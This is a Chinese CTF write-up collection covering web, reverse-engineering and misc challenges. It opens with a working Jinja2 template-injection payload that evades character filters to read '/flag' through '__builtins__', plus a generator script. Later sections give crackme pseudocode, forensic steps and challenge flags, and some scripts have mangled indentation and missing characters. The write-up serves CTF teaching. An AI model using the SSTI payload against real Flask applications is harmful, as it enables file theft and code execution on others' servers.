出这个题是想自己挖一点新的的东西,出来,然后看了 python 源码剖析,本来的想法是利用 code 类,构造字节码执行命令,,但是后来发现其实不用找基类就可以执行任意命令,就没那样出,然后这个 trick 出给别的地方了,当时还有另一个想法,就是没有 requests,chr,还能不能构造任意字符呢,然后为了增加难度,就随手 ban 了+,_,自己试着挖出来一种利用方式,就有了这个题,

```
get % 
找到特殊字符&lt;,url 编码,得到% 
`{`%set pc = g|lower|list|first|urlencode|first%`}` 

get 'c' 
`{`%set c=dict(c=1).keys()|reverse|first%`}` 
字符串拼接 
`{`%set udl=dict(a=pc,c=c).values()|join %`}` 
这样就可以得到任意字符了 
get _ 
`{`%set udl2=udl%(95)%`}``{``{`udl`}``}` 
`{`%set all=dict(a=all,c=res).values()|join %`}`
```

写个脚本

```
payload = '`{`%set pc = g|lower|list|first|urlencode|first%`}``{`%set c=dict(c=1).keys()|reverse|first%`}``{`%set udl=dict(a=pc,c=c).values()|join %`}`' 
payload = '' 

def get_alp(alp, goal): 
    num = ord(alp) 
    result = '`{`%set `{`goal`}`=dict(a=`{`goal`}`,c=udl%(`{`num`}`)).values()|join %`}`'.replace( 
        '`{`num`}`', str(num)).replace('`{`goal`}`', goal) 
    return result 

def get_word(des, goal): 
    # goal = 'ds2' 
    # des = '__globals__' 
    result = '' 
    for i in des: 
        result += (get_alp(i, goal)) 
    return result 

def main(): 
    # poc = "url_for.__globals__.__builtins__.open('/flag').read()" 
    i = 0 
    while(1): 
        text = input('&gt;') 
        print('i'+str(i), end=':') 
        print(get_word(text, 'i'+str(i))) 
        i += 1 

main()
```

最终 paylaod

```
http://127.0.0.1:19009/?name=`{`%set pc = g|lower|list|first|urlencode|first%`}``{`%set c=dict(c=1).keys()|reverse|first%`}``{`%set udl=dict(a=pc,c=c).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(95)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(95)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(105)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(110)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(105)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(116)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(95)).values()|join %`}``{`%set ds=dict(a=ds,c=udl%(95)).values()|join %`}` 
`{`%set ds2=dict(a=ds2,c=udl%(95)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(95)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(103)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(108)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(111)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(98)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(97)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(108)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(115)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(95)).values()|join %`}``{`%set ds2=dict(a=ds2,c=udl%(95)).values()|join %`}` 
`{`%set i0=dict(a=i0,c=udl%(47)).values()|join %`}``{`%set i0=dict(a=i0,c=udl%(102)).values()|join %`}``{`%set i0=dict(a=i0,c=udl%(108)).values()|join %`}``{`%set i0=dict(a=i0,c=udl%(97)).values()|join %`}``{`%set i0=dict(a=i0,c=udl%(103)).values()|join %`}` 
`{`%set i1=dict(a=i1,c=udl%(95)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(95)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(98)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(117)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(105)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(108)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(116)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(105)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(110)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(115)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(95)).values()|join %`}``{`%set i1=dict(a=i1,c=udl%(95)).values()|join %`}` 
`{`%for k,v in (app|attr(ds)|attr(ds2)).items()%`}``{`%if (k|string )==i1  %`}``{``{`v.open(i0).read()`}``}``{`%endif%`}``{`%endfor%`}`
```



## re

### <a class="reference-link" name="%E7%99%BD%E7%BB%99.exe"></a>白给.exe

直接在程序里就可以找到 flag

用 ida 查看。第一个在 data 段，第二个在 main 函数的反汇编窗口中可以看见。

**flag`{`kjdfeoijfeoncknafljfsdklf679756876`}` **

### <a class="reference-link" name="98%20%E5%B9%B4%E7%9A%84%EF%BC%8C%E6%88%91%E7%8E%A9%E4%B8%8D%E8%BF%87%E5%A5%B9"></a>98 年的，我玩不过她

```
_int64 sub_140011950() 
`{` 
  char *v0; // rdi 
  signed __int64 i; // rcx 
  char v3; // [rsp+0h] [rbp-20h] 
  char Buffer[64]; // [rsp+28h] [rbp+8h] 
  char v5[44]; // [rsp+68h] [rbp+48h] 
  int j; // [rsp+94h] [rbp+74h] 
  char Str1; // [rsp+B8h] [rbp+98h] 
  v0 = &amp;v3; 
  for ( i = 106i64; i; --i ) 
  `{` 
    *(_DWORD *)v0 = -858993460; 
    v0 += 4; 
  `}` 
  sub_140011087(&amp;unk_140021006); 
  sub_1400111D6("miss fish tell you the secret\n"); 
  sub_1400111D6("miss fish:%s\n"); 
  sub_1400111D6("please tell me your flag\n"); 
  j_gets_0(Buffer); 
  for ( j = 0; j &lt; 10; ++j ) 
    v5[j] = Buffer[j + 5]; 
  memset(&amp;Str1, 0, 0xAui64); 
  sub_14001128A(v5, &amp;Str1); 
  if ( j_strcmp_0(&amp;Str1, "I_love_y&amp;u") ) 
  `{` 
    sub_1400111D6("You have been done!\n"); 
    exit(1); 
  `}` 
  sub_1400111D6("you finally get it\n"); 
  sub_140011348(&amp;v3, &amp;unk_14001AA80); 
  return 0i64; 
`}`
```

主函数最后给出了比较的字符串“I_love_y&amp;u”

```
for ( j = 0; j &lt; 10; ++j ) 
    v5[j] = Buffer[j + 5];
```

取出 flag 中间部分，去掉 flag`{``}`

主要类似 VM 的题的部分在这里

```
Dest = a2; 
  v32 = a1; 
  v2 = &amp;v5; 
  for ( i = 298i64; i; --i ) 
  `{` 
    *(_DWORD *)v2 = -858993460; 
    v2 += 4; 
  `}` 
  sub_140011087(&amp;unk_140021006); 
  v6 = 10; 
  for ( j = 0; j &lt; v6; ++j ) 
  `{` 
    v7 = *(_BYTE *)(v32 + j); 
    v31 = v7 - 48; 
    switch ( v7 ) 
    `{` 
      case 0x30u: 
        Source = v7 - 48; 
        v11 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x31u: 
        v7 = v7 &amp; 1 | 0x48; 
        Source = v7; 
        v12 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x32u: 
        v7 = v7 &amp; 2 ^ 0x48; 
        Source = v7; 
        v13 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x33u: 
        v7 = (v7 &amp; 3) + 72; 
        Source = v7; 
        v14 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x34u: 
        v7 = (v7 | 1) + 23; 
        Source = v7; 
        v15 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x35u: 
        v7 = (v7 | 2) + 10; 
        Source = v7; 
        v16 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x36u: 
        v7 = (v7 | 3) + 11; 
        goto LABEL_15; 
      case 0x45u: 
        v7 += 32; 
        Source = v7; 
        v18 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x5Fu: 
LABEL_15: 
        Source = v7; 
        v17 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x61u: 
        v7 ^= 0xEu; 
        Source = v7; 
        v19 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x62u: 
        v7 ^= 0xDu; 
        Source = v7; 
        v20 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        goto LABEL_19; 
      case 0x63u: 
LABEL_19: 
        v7 ^= 0x15u; 
        Source = v7; 
        v21 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        goto LABEL_20; 
      case 0x64u: 
LABEL_20: 
        v7 ^= 1u; 
        Source = v7; 
        v22 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        goto LABEL_21; 
      case 0x65u: 
LABEL_21: 
        Source = v7; 
        v23 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x68u: 
        v7 += 4; 
        Source = v7; 
        v24 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x6Au: 
        v7 &amp;= 0x60u; 
        Source = v7; 
        v25 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x6Bu: 
        v7 ^= 0x4Eu; 
        Source = v7; 
        v26 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        continue; 
      case 0x6Cu: 
        v7 -= 75; 
        goto LABEL_26; 
      case 0x6Fu: 
LABEL_26: 
        v7 = 38; 
        Source = 38; 
        v27 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        break; 
      case 0x74u: 
        v7 += 2; 
        Source = v7; 
        v28 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        break; 
      case 0x75u: 
        v7 = 2 * ((signed int)v7 &gt;&gt; 1) + 1; 
        Source = v7; 
        v29 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        break; 
      case 0x79u: 
        v7 = 8 * ((signed int)v7 &gt;&gt; 3) | 1; 
        Source = v7; 
        v30 = 1i64; 
        v9 = 0; 
        j_strcat_0(Dest, &amp;Source); 
        break; 
      default: 
        continue; 
    `}` 
  `}` 
  return sub_140011348(&amp;v5, &amp;unk_140019C80); 
`}`
```

其实这题基本上已经不需要逆向的思维了，直接写个类似的代码跑出来答案一一对比就好了，具体代码就不写了，手算也可以做出来。

**flag`{`1_hatE_you`}` **

### <a class="reference-link" name="four%20steps.exe"></a>four steps.exe

主函数伪代码如下：

```
__int64 sub_1400159A0() 
`{` 
  char *v0; // rdi 
  signed __int64 i; // rcx 
  char v3; // [rsp+0h] [rbp-20h] 
  char Buffer; // [rsp+30h] [rbp+10h] 
  char v5; // [rsp+31h] [rbp+11h] 
  unsigned __int8 v6; // [rsp+32h] [rbp+12h] 
  unsigned __int8 v7; // [rsp+33h] [rbp+13h] 
  v0 = &amp;v3; 
  for ( i = 130i64; i; --i ) 
  `{` 
    *(_DWORD *)v0 = -858993460; 
    v0 += 4; 
  `}` 
  sub_140011082((__int64)&amp;unk_140021006); 
  sub_1400111D1("请输入你的 flag 吧\n"); 
  j_gets_0(&amp;Buffer); 
  sub_1400113AC((__int64)&amp;Buffer, 4i64); 
  if ( Buffer != 96 || v5 != 106 || v6 != 153 || v7 != 159 ) 
    exit(1); 
  if ( !(unsigned int)sub_1400113B1(&amp;Buffer, 4i64) ) 
    sub_1400113B6((__int64)&amp;Buffer, 4i64); 
  sub_1400113C5((__int64)&amp;Buffer, 4i64); 
  sub_14001133E((__int64)&amp;v3, (__int64)&amp;unk_14001A910); 
  return 0i64; 
`}` 
3AC,3B1,3B6,3C5 是加密的四个函数。Buffer 是你要输入的 flag。 
第一个加密函数 
void __fastcall sub_1400156E0(__int64 a1, int a2) 
`{` 
  char *v2; // rdi 
  signed __int64 i; // rcx 
  char v4; // [rsp+0h] [rbp-20h] 
  int j; // [rsp+24h] [rbp+4h] 
  int v6[261]; // [rsp+50h] [rbp+30h] 
  int v7; // [rsp+464h] [rbp+444h] 
  int v8; // [rsp+484h] [rbp+464h] 
  __int64 v9; // [rsp+700h] [rbp+6E0h] 
  int v10; // [rsp+708h] [rbp+6E8h] 
  v10 = a2; 
  v9 = a1; 
  v2 = &amp;v4; 
  for ( i = 0x1BAi64; i; --i ) 
  `{` 
    *(_DWORD *)v2 = 3435973836; 
    v2 += 4; 
  `}` 
  sub_140011082((__int64)&amp;unk_140021006); 
  for ( j = 0; j &lt; 256; ++j ) 
    v6[j] = j; 
  for ( j = 0; j &lt; 128; ++j ) 
  `{` 
    if ( j % 2 == 1 ) 
    `{` 
      v7 = v6[j]; 
      v6[j] = v6[256 - j]; 
      v6[256 - j] = v7; 
    `}` 
  `}` 
  for ( j = 0; j &lt; v10; ++j ) 
  `{` 
    v8 = v6[*(unsigned __int8 *)(v9 + j)]; 
    *(_BYTE *)(v9 + j) = v8 ^ 6; 
  `}` 
  sub_14001133E((__int64)&amp;v4, (__int64)&amp;unk_14001A8B0); 
`}`
```

将 0~255 放到一个数组中，再讲奇数位和 255-该奇数位进行一次换位，形成当前的一个随机数盒。

flag 输入的前四位的每一位作为随机数盒的下标得到的随机数盒的值和 6 进行异或，最后得出来的值进行比较。

第二个加密函数

```
__int64 __fastcall sub_140015D30(unsigned __int8 *a1) 
`{` 
  __int64 *v1; // rdi 
  signed __int64 i; // rcx 
  __int64 v4; // [rsp+0h] [rbp-20h] 
  int v5; // [rsp+E0h] [rbp+C0h] 
  unsigned __int8 *v6; // [rsp+110h] [rbp+F0h] 
  v6 = a1; 
  v1 = &amp;v4; 
  for ( i = 62i64; i; --i ) 
  `{` 
    *(_DWORD *)v1 = -858993460; 
    v1 = (__int64 *)((char *)v1 + 4); 
  `}` 
  sub_140011082((__int64)&amp;unk_140021006); 
  v5 = (signed int)v6[4] &gt;&gt; 4; 
  if ( ((signed int)v6[5] &gt;&gt; 4) + v5 != 13 
    || (v5 = (signed int)v6[6] &gt;&gt; 4, ((signed int)v6[7] &gt;&gt; 4) + v5 != 13) 
    || (v5 = v6[4] &amp; 0xF, v5 - (v6[5] &amp; 0xF) != 10) 
    || (v5 = v6[6] &amp; 0xF, v5 - (v6[7] &amp; 0xF) != 11) 
    || (v5 = v6[6] &amp; 0xF, v5 - (v6[5] &amp; 0xF) != 13) 
    || (v5 = (signed int)v6[5] &gt;&gt; 4, v5 != (signed int)v6[6] &gt;&gt; 4) ) 
  `{` 
    exit(2); 
  `}` 
  return 0i64; 
`}`
```

这个函数有点类似解方程，把它列出来可以找找突破口（嘤嘤嘤，太懒了，懒得写出来了）。

第三个加密函数

```
int __fastcall sub_140016370(__int64 a1, int a2) 
`{` 
  __int64 *v2; // rdi 
  signed __int64 i; // rcx 
  size_t v4; // rax 
  int result; // eax 
  __int64 v6; // [rsp+0h] [rbp-20h] 
  const char *v7; // [rsp+28h] [rbp+8h] 
  int v8; // [rsp+44h] [rbp+24h] 
  char *Str1; // [rsp+68h] [rbp+48h] 
  int v10; // [rsp+84h] [rbp+64h] 
  int v11; // [rsp+A4h] [rbp+84h] 
  int v12; // [rsp+C4h] [rbp+A4h] 
  int v13; // [rsp+194h] [rbp+174h] 
  __int64 v14; // [rsp+1C0h] [rbp+1A0h] 
  int v15; // [rsp+1C8h] [rbp+1A8h] 
  v15 = a2; 
  v14 = a1; 
  v2 = &amp;v6; 
  for ( i = 106i64; i; --i ) 
  `{` 
    *(_DWORD *)v2 = -858993460; 
    v2 = (__int64 *)((char *)v2 + 4); 
  `}` 
  sub_140011082((__int64)&amp;unk_140021006); 
  v7 = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890+/"; 
  v8 = 4 * (v15 / 3) + 4; 
  v4 = v8 + 1i64; 
  if ( (unsigned __int64)v8 &gt;= 0xFFFFFFFFFFFFFFFFui64 ) 
    v4 = -1i64; 
  Str1 = (char *)malloc(v4); 
  Str1[v8] = 0; 
  v10 = 0; 
  v11 = 0; 
  while ( v10 &lt; v8 - 2 ) 
  `{` 
    Str1[v10] = v7[(signed int)*(unsigned __int8 *)(v14 + v11 + 8) &gt;&gt; 2]; 
    Str1[v10 + 1] = v7[((signed int)*(unsigned __int8 *)(v14 + v11 + 9) &gt;&gt; 4) | 16 * (*(_BYTE *)(v14 + v11 + 8) &amp; 3)]; 
    Str1[v10 + 2] = v7[((signed int)*(unsigned __int8 *)(v14 + v11 + 10) &gt;&gt; 6) | 4 * (*(_BYTE *)(v14 + v11 + 9) &amp; 0xF)]; 
    Str1[v10 + 3] = v7[*(_BYTE *)(v14 + v11 + 10) &amp; 0x3F]; 
    v11 += 3; 
    v10 += 4; 
  `}` 
  v13 = v15 % 3; 
  if ( v15 % 3 == 1 ) 
  `{` 
    Str1[v10 - 2] = 61; 
    Str1[v10 - 1] = 61; 
  `}` 
  else if ( v13 == 2 ) 
  `{` 
    Str1[v10 - 1] = 61; 
  `}` 
  v12 = 0; 
  result = j_strcmp_0(Str1, "o3kZl3=="); 
  v12 = result; 
  if ( result ) 
    exit(3); 
  return result; 
`}`
```

这个是换了表的 base64 编码，可以用解密软件来算答案。

最后一个加密部分如下：

```
__int64 __fastcall sub_140016210(unsigned __int8 *a1, int a2) 
`{` 
  __int64 *v2; // rdi 
  signed __int64 i; // rcx 
  __int64 result; // rax 
  __int64 v5; // [rsp+0h] [rbp-20h] 
  int j; // [rsp+24h] [rbp+4h] 
  int v7; // [rsp+44h] [rbp+24h] 
  int v8; // [rsp+114h] [rbp+F4h] 
  unsigned __int8 *v9; // [rsp+140h] [rbp+120h] 
  int v10; // [rsp+148h] [rbp+128h] 
  v10 = a2; 
  v9 = a1; 
  v2 = &amp;v5; 
  for ( i = 74i64; i; --i ) 
  `{` 
    *(_DWORD *)v2 = -858993460; 
    v2 = (__int64 *)((char *)v2 + 4); 
  `}` 
  sub_140011082((__int64)&amp;unk_140021006); 
  for ( j = 0; j &lt; v10; ++j ) 
  `{` 
    v8 = (signed int)v9[j + 12] &gt;&gt; 4; 
    v7 = 16 * (v9[j + 12] &amp; 0xF) + v8; 
    v9[j + 12] = v7; 
  `}` 
  if ( v9[12] != 214 || v9[13] != 86 || v9[14] != 18 || (result = v9[15], (_DWORD)result != 215) ) 
    exit(4); 
  return result; 
`}`
```

for 循环对最后四个数字进行数字的十位和个位的交换。

flag：**flag`{`answer_me!`}` **

### <a class="reference-link" name="tea.exe%EF%BC%880%20%E8%A7%A3%EF%BC%89"></a>tea.exe（0 解）

第一个加密函数中给出了字符串，进行小写变大写，_变空格操作后成为新的字符串。

往下可以看到给出的表，总共 66 位，然后我写 wp 的时候发现题目有问题，所以这题作废了，就当做这道题没存在。（尴尬）

### <a class="reference-link" name="mov.exe%EF%BC%880%20%E8%A7%A3%EF%BC%89"></a>mov.exe（0 解）

这个题懒得写了，全靠感觉和经验。（虽然我也不会）

很困扰人的 mov 混淆，目前好像没有效果很好的反混淆程序。考虑到这点题目代码很简单，源代码如下：

```
#include&lt;stdio.h&gt; 
#include&lt;stdlib.h&gt; 
#include&lt;string.h&gt; 
char ChangeFlag[]=`{`-14,-7,-16,-10,0,1,-11,0,-43,-4,-83,1,23,20,-6,39,9,-11,-2,-12,7,-3,-11,19`}`; 
char sinFlag[]="ctfflag`{`It's_wrong_flag`}`"; 
int main()`{` 
    //flag`{`welcome_to_reverse`}` 
    //printf("input your flag\n"); 
    char flag[25]=`{`0`}`; 
    int i; 
    printf("input your flag\n"); 
    scanf("%s",flag); 
    for(i=0;i&lt;24;i++)`{` 
        flag[i]^=23; 
        flag[i]+=ChangeFlag[i]; 
    `}` 
    if(strcmp(flag,sinFlag)==0)`{` 
        printf("right\n"); 
    `}` 
    else`{` 
        printf("baby,nonononono!\n"); 
    `}` 
    return 0; 
`}`
```

mov 虽然让程序变得混乱，但是关键部位还是可以找到规律。

**flag`{`welcome_to_reverse`}`**



## misc

### **Hacked_By_PTT0**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014f64665f599bb6a8.png)

Hint： 看看里面几个比较大的东西

朴实无华流量分析，没准大佬能看出这题的流量是 Netsparker 的扫描流量。其中有个 shell.php，然后上传了一个 Hacked_By_PTT0.doc，然后 flag 伪装成了一个 doc 的配置文件。

**解题：**

面对一堆流量包，可以直接字符串搜索一下关键字 flag、shell、upload 啥的，这里用 shell、upfile、sql 等都可直接定位到 shell 文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012b33ba4d8f0ddff1.png)

追踪 HTTP 流，可以看到其中有一个 POST 请求包含 upfiles，继续查看可发现上传了一个 doc 文件.

[![](https://p5.ssl.qhimg.com/t01884a967631eae633.png)](https://p5.ssl.qhimg.com/t01884a967631eae633.png)

对 Data 右键，导出分组字节流，保存为 bin 文件

[![](https://p4.ssl.qhimg.com/t01ed81f7cf52119a4d.png)](https://p4.ssl.qhimg.com/t01ed81f7cf52119a4d.png)

改后缀为.zip，解压得到 doc 得配置文件。熟悉 doc、一个个试或用工具都能发现其 jquerySettings.xml 是一个 PNG 格式的文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010cbd20b5d63db6f1.png)

但是改成 PNG 会打不开，用 winhex 分析，此处多了个 20

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0128c4537506a8d86e.png)

打开即可得到 **flag`{`S0_sO_eAsy_MISc?`}` **

[![](https://p0.ssl.qhimg.com/t01c729c447fcfd2cc6.png)](https://p0.ssl.qhimg.com/t01c729c447fcfd2cc6.png)

### <a class="reference-link" name="%CE%B1%E5%B1%82"></a>α层

#### <a class="reference-link" name="Description"></a>Description

这波啊，这波在阿尔法层

#### <a class="reference-link" name="Analyze"></a>Analyze

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0156e4a9f2e67a8349.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f672b851300a073e.png)

#### <a class="reference-link" name="Solve"></a>Solve

没啥难的，加个异或或者阿尔法图层就出了

#### <a class="reference-link" name="flag"></a>flag

```
flag`{`YjZCVprHLi8Hi2hXgDZi2kOR9tWZQqSV`}`
```

### <a class="reference-link" name="%E6%88%91%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%EF%BC%8C%E6%97%B6%E5%B0%9A%E6%97%B6%E5%B0%9A%E6%9C%80%E6%97%B6%E5%B0%9A"></a>我的二维码，时尚时尚最时尚

#### <a class="reference-link" name="Description"></a>Description

二维码真的好玩，于是尖尖自己设计了一个二维码，你能扫出来吗？

#### <a class="reference-link" name="Analyze"></a>Analyze

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017774c2a11c824041.png)

看似正常的二维码，foremost 后得到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0108ed5589d0538faa.png)

易看出是掩码，根据二维码的规则异或即可。

#### <a class="reference-link" name="Solve"></a>Solve

脚本一把梭

```
from PIL import Image 
p1 = Image.open('qrcode.png').convert('L') 
p2 = Image.open('掩码.png').convert('L') 
a1,b1 = p1.size 
a2,b2 = p2.size 
p1_block = 12 
p1_data = [] 
for y in range(10,b1,p1_block): 
    for x in range(10,a1,p1_block): 
print(x,y,p1.getpixel((x,y))) 
        if p1.getpixel((x,y)) != 255: 
            p1_data.append(1) 
        else: 
            p1_data.append(0) 
y_start = 3 x_start=4 
p2_block = 11 
p2_data = [] 
for y in range(4,b2,p2_block): 
    for x in range(4,a2,p2_block): 
        if p2.getpixel((x, y)) != 0: 
            p2_data.append(0) 
        else: 
            p2_data.append(1) 
print(len(p2_data)) 
fin_data = [] 
for i in range(len(p2_data)): 
    fin_data.append(p1_data[i] [i]) 
b = Image.new('L',(10,10),0) 
w = Image.new('L',(10,10),255) 
np = Image.new('L',(290,290),255) 
for i in range(len(fin_data)): 
x = i % 29 
y = i // 29 
if p1_data[i] == 1: 
np.paste(b, (x  10, y  10)) 
else: 
np.paste(w, (x  10, y  10)) 
np.save("p1.png") 
for i in range(len(fin_data)): 
x = i % 29 
y = i // 29 
if p2_data[i] == 1: 
np.paste(b, (x  10, y  10)) 
else: 
np.paste(w, (x  10, y  10)) 
np.save("p2.png") 
for i in range(len(fin_data)): 
    x = i%29 
    y = i//29 
    if fin_data[i] == 1: 
        np.paste(b,(x10,y10)) 
    else: 
        np.paste(w,(x10,y10)) 
np.save("res.png")
```

#### <a class="reference-link" name="flag"></a>flag

```
flag`{`23fea3b2b924e1ed92731e0141e883a0`}`
```

### <a class="reference-link" name="make_misc_great_again"></a>make_misc_great_again

#### <a class="reference-link" name="Description"></a>Description

神秘代码 1whGlIjZ1ReEiTUSXxSbZUw/vnz4

#### <a class="reference-link" name="Analyze"></a>Analyze

贴吧老司机都知道了，是百度云盘的分享链接后缀，加上 [https://pan.baidu.com/s/后得到下载地址，](https://pan.baidu.com/s/%E5%90%8E%E5%BE%97%E5%88%B0%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%8C) `/` 后是提取密码，然后是一个压缩包，很容易想到是内存取证类型的题。解压后是一个镜像和另一个压缩包，然后因为出题时间比较久远，所以有一个非预期（求轻虐）。即直接 `strings flag？？.raw | grep flag`<br>
即可得到 flag，原因是当时制作镜像的时候未清理粘贴板记录，导致了该非预期。预期解应该是通过 volatility 找到系统密码，解压压缩包。详细操作见 [https://blog.51cto.com/13352079/2434792?source=dra。解压后是一个](https://blog.51cto.com/13352079/2434792?source=dra%E3%80%82%E8%A7%A3%E5%8E%8B%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AA) bitLocker 的虚拟硬盘，猜测密码仍在镜像中，此处可以用 `Elcomsoft Forensic Disk Decryptor` 工具直接提取出 key，然后打开后看隐藏文件即可得到 flag。

#### <a class="reference-link" name="flag"></a>flag

```
flag`{`d136b36415188a2ddf04e5bd64be2ba3`}`
```

### <a class="reference-link" name="Broken%20RedLine"></a>Broken RedLine

#### <a class="reference-link" name="Description"></a>Description

尖尖的红线断开了，呜呜呜呜呜呜呜

#### <a class="reference-link" name="Analyze"></a>Analyze

图片名称为 Find_right_width_and_hieht_by_CRC32.png，于是用 crc32 的脚本爆破出宽高

```
import zlib 
import struct 
filename = 'mod.png' 
with open(filename, 'rb') as f: 
    all_b = f.read() 
    data_f = all_b[:12] 
data = all_b[12:29] 
print(data) 
    data_r = all_b[29:] 
    data_idch = all_b[12:17] 
    data_l = all_b[25:29] 
width = all_b[17:21] 
height = all_b[21:25] 
print(width, height) 
    crc32key = int(all_b[29:33].hex(), 16) 
    data = '' 
    for w in range(0, 1960): 
        for h in range(0, 1960): 
            width = struct.pack('&gt;i', w) 
            height = struct.pack('&gt;i', h) 
            data = data_idch + width + height + data_l 
            print(data) 
print(len(data)) 
            if zlib.crc32(data) == crc32key: 
                print(w, h) 
                with open('r.png', 'wb') as f1: 
                    f1.write(data_f + data + data_r) 
                    break
```

得到其宽为 1440，高为 960

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01026da2e4c02bc19b.png)

